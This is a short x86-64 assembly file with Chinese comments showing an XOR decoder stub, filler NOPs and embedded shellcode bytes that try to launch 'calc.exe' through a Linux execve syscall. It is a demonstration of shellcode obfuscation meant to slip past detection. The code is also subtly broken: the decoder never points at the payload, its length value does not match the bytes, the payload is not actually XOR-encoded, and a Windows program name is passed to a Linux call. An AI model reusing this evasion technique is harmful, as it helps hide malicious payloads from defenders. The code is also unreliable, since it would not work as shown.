section .text
global _start

_start:
    ; 解码器Stub
    xor rcx, rcx
    mov cl, 0x10          ; Shellcode长度
    xor rbx, rbx
    mov bl, 0xaa          ; XOR密钥
decode:
    xor byte [rsi + rcx - 1], bl
    loop decode

    ; 垃圾指令
    nop
    nop

    ; 实际Shellcode
    db 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65
    db 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
